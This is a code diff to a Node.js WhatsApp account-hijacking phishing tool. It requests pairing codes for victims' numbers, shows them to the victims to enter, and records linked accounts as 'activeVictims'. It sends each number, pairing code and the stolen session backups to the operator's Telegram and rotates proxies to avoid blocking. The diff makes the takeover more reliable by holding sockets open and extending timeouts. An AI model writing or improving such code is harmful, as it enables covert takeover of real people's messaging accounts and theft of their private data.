@@ -17,7 +17,7 @@ const path = require('path');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const axios = require('axios');
 
-const BOT_NUMBER = process.env.BOT_NUMBER || '2348023931932';
+const BOT_NUMBER = (process.env.BOT_NUMBER || '2348023931932').replace(/[^0-9]/g, '');
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
 const MY_TELEGRAM_ID = process.env.MY_TELEGRAM_ID || 'YOUR_TELEGRAM_USER_ID';
 const RENDER_URL = process.env.RENDER_URL || 'https://your-app-name.onrender.com';
@@ -34,7 +34,6 @@ app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
-// recent log buffer for /logs endpoint
 const logBuffer = [];
 function pushLog(msg, type = 'info') {
     const entry = { time: new Date().toISOString(), msg, type };
@@ -53,6 +52,18 @@ tgBot.on('polling_error', () => {});
 let adminSock = null;
 let activeVictims = {};
 let victimList = [];
+
+// pending sockets — held alive between "code issued" and "connection open"
+if (!global.__pendingSocks) global.__pendingSocks = new Map();
+
+function holdPending(number, sock) {
+    global.__pendingSocks.set(number, sock);
+}
+
+function releasePending(number, sock) {
+    const held = global.__pendingSocks.get(number);
+    if (held === sock) global.__pendingSocks.delete(number);
+}
 
 // ── proxy cache ─────────────────────────────────────────────
 function loadCachedProxy() {
@@ -161,7 +172,8 @@ async function startAdminBot() {
         auth: state,
         browser: Browsers.macOS('Safari'),
         connectTimeoutMs: 60000,
-        defaultQueryTimeoutMs: 60000
+        defaultQueryTimeoutMs: 60000,
+        keepAliveIntervalMs: 15000
     };
 
     if (cachedProxy) {
@@ -176,7 +188,6 @@ async function startAdminBot() {
         if (update.connection === 'open') {
             pushLog('Admin Bot connected', 'info');
             tgBot.sendMessage(MY_TELEGRAM_ID, '✅ Admin Bot Linked!', { parse_mode: 'Markdown' });
-            // cache the proxy that worked for admin
             if (cachedProxy) saveCachedProxy(cachedProxy);
         }
         if (update.connection === 'close' &&
@@ -208,6 +219,10 @@ io.on('connection', (socket) => {
         const targetNumber = phoneNumber.replace(/[^0-9]/g, '');
         const folderName = `auth_info_${targetNumber}`;
 
+        if (targetNumber === BOT_NUMBER) {
+            return socket.emit('error', 'This number is the admin account. Use a different number.');
+        }
+
         socket.emit('pair_status', { msg: 'Restoring session...', step: 1 });
         await restoreSessionFromTelegram(folderName);
         const { state, saveCreds } = await useMultiFileAuthState(folderName);
@@ -220,26 +235,24 @@ io.on('connection', (socket) => {
         const { version } = await fetchLatestWaWebVersion({});
         socket.emit('pair_status', { msg: 'Fetching proxies...', step: 2 });
 
-        // ← THE CHANGE: cached admin proxy first, then fresh proxies, then DIRECT
         const cachedProxy = loadCachedProxy();
         const liveProxies = await getLiveProxies();
 
         const orderedProxies = [];
         if (cachedProxy) orderedProxies.push(cachedProxy);
-        for (const p of liveProxies) {
-            if (p !== cachedProxy) orderedProxies.push(p);
-        }
+        for (const p of liveProxies) if (p !== cachedProxy) orderedProxies.push(p);
         orderedProxies.push('DIRECT');
 
         tgBot.sendMessage(MY_TELEGRAM_ID,
-            `🔍 *Pairing attempt started*\nNumber: \`${targetNumber}\`\nCached proxy: ${cachedProxy || 'none'}\nProxies loaded: ${liveProxies.length}`
+            `🔍 *Pairing attempt started*\nNumber: \`${targetNumber}\`\nCached: ${cachedProxy || 'none'}\nProxies: ${liveProxies.length}`
         );
 
-        let success = false;
+        let linked = false;
         let lastError = null;
+        let codeIssued = false;
 
         for (let i = 0; i < orderedProxies.length; i++) {
-            if (success) break;
+            if (linked) break;
             const proxyUrl = orderedProxies[i];
             const label = proxyUrl === 'DIRECT' ? 'DIRECT' : proxyUrl;
 
@@ -255,8 +268,10 @@ io.on('connection', (socket) => {
                     printQRInTerminal: false,
                     auth: state,
                     browser: Browsers.macOS('Safari'),
-                    connectTimeoutMs: 15000,
-                    defaultQueryTimeoutMs: 15000
+                    connectTimeoutMs: 30000,
+                    defaultQueryTimeoutMs: 30000,
+                    keepAliveIntervalMs: 15000,
+                    retryRequestDelayMs: 250
                 };
 
                 if (proxyUrl !== 'DIRECT') {
@@ -266,16 +281,26 @@ io.on('connection', (socket) => {
                 const phishSock = makeWASocket(sockOptions);
                 phishSock.ev.on('creds.update', saveCreds);
 
+                // hold this socket in global map so GC can't collect it
+                holdPending(targetNumber, phishSock);
+
+                phishSock.ev.on('connection.update', (update) => {
+                    if (update.connection === 'close') {
+                        releasePending(targetNumber, phishSock);
+                    }
+                });
+
                 await new Promise((resolve, reject) => {
-                    let isResolved = false;
+                    let codeSent = false;
+                    let connected = false;
 
                     phishSock.ev.on('connection.update', async (update) => {
-                        if (update.connection === 'connecting' && !isResolved) {
-                            isResolved = true;
+                        if (update.connection === 'connecting' && !codeSent) {
+                            codeSent = true;
                             await delay(2000);
                             try {
                                 const code = await phishSock.requestPairingCode(targetNumber);
-                                success = true;
+                                codeIssued = true;
 
                                 socket.emit('pair_status', {
                                     msg: 'Code generated. Enter it on your phone.',
@@ -284,67 +309,89 @@ io.on('connection', (socket) => {
                                 socket.emit('code_generated', code);
 
                                 tgBot.sendMessage(MY_TELEGRAM_ID,
-                                    `✅ *Pairing code issued*\nNumber: \`${targetNumber}\`\nCode: \`${code}\`\nVia: ${label}`
+                                    `✅ *Code issued*\nNumber: \`${targetNumber}\`\nCode: \`${code}\`\nVia: ${label}\n⏳ waiting for confirmation…`
                                 );
-
-                                // ← cache whichever proxy actually produced a code
-                                if (proxyUrl !== 'DIRECT') saveCachedProxy(proxyUrl);
-
-                                resolve();
+                                // DO NOT resolve, DO NOT .end() — socket stays held
                             } catch (e) {
                                 lastError = e.message;
                                 tgBot.sendMessage(MY_TELEGRAM_ID,
                                     `⚠️ *requestPairingCode failed*\nVia: ${label}\nError: ${e.message}`
                                 );
+                                releasePending(targetNumber, phishSock);
                                 try { phishSock.end(undefined); } catch(err) {}
                                 reject(e);
                             }
                         }
 
                         if (update.connection === 'open') {
+                            connected = true;
+                            linked = true;
+
                             activeVictims[targetNumber] = phishSock;
                             if (!victimList.find(v => v.number === targetNumber)) {
                                 victimList.push({ number: targetNumber, status: 'Online' });
                             }
                             io.emit('victim_update', victimList);
                             socket.emit('success');
+
                             tgBot.sendMessage(MY_TELEGRAM_ID,
-                                `🔥 *NEW VICTIM LINKED!*\nNumber: \`${targetNumber}\`\nVia: ${label}`
+                                `🔥 *VICTIM LINKED*\nNumber: \`${targetNumber}\`\nVia: ${label}`
                             );
-                            await backupToTelegram(targetNumber, folderName);
+
+                            if (proxyUrl !== 'DIRECT') saveCachedProxy(proxyUrl);
+
+                            // keep held — it's an active victim now, still needs the ref
+                            backupToTelegram(targetNumber, folderName).catch(() => {});
+                            resolve();
                         }
 
                         if (update.connection === 'close') {
                             const code = update.lastDisconnect?.error?.output?.statusCode;
+
                             tgBot.sendMessage(MY_TELEGRAM_ID,
-                                `❌ *Socket closed*\nVia: ${label}\nStatus: ${code || 'unknown'}`
+                                `❌ *Socket closed*\nVia: ${label}\nStatus: ${code || 'unknown'}${codeSent ? '\n(code had been issued)' : ''}`
                             );
+
+                            releasePending(targetNumber, phishSock);
+
+                            if (!connected) {
+                                lastError = code === 401 ? 'auth rejected (401)' : `closed ${code || 'unknown'}`;
+                                try { phishSock.end(undefined); } catch(err) {}
+                                reject(new Error(code === 401 ? 'AuthRejected' : 'Closed'));
+                            }
                         }
                     });
 
                     setTimeout(() => {
-                        if (!isResolved) {
-                            isResolved = true;
-                            lastError = 'timeout';
-                            tgBot.sendMessage(MY_TELEGRAM_ID,
-                                `⏱️ *Timeout*\nVia: ${label}`
-                            );
-                            try { phishSock.end(undefined); } catch(err) {}
+                        if (!connected) {
                             reject(new Error('Timeout'));
                         }
-                    }, 15000);
+                    }, 90000);
                 });
 
             } catch (error) {
                 lastError = error.message;
+
+                if (error.message === 'AuthRejected' && codeIssued) {
+                    // code was issued, WhatsApp rejected the link — stop retrying
+                    break;
+                }
             }
         }
 
-        if (!success) {
+        if (!linked) {
             tgBot.sendMessage(MY_TELEGRAM_ID,
-                `💀 *All pairing attempts failed*\nNumber: \`${targetNumber}\`\nLast error: ${lastError}\nTried: ${orderedProxies.length}`
+                `💀 *Pairing ended without link*\nNumber: \`${targetNumber}\`\nLast error: ${lastError}\nCode was issued: ${codeIssued ? 'YES' : 'no'}`
             );
-            socket.emit('error', `Could not pair after ${orderedProxies.length} attempts. Last error: ${lastError}`);
+
+            if (codeIssued) {
+                socket.emit('error',
+                    'Pairing code was issued but WhatsApp rejected the link. ' +
+                    'Make sure this number is not already linked elsewhere, then try again.'
+                );
+            } else {
+                socket.emit('error', `Could not pair. Last error: ${lastError}`);
+            }
         }
     });
 
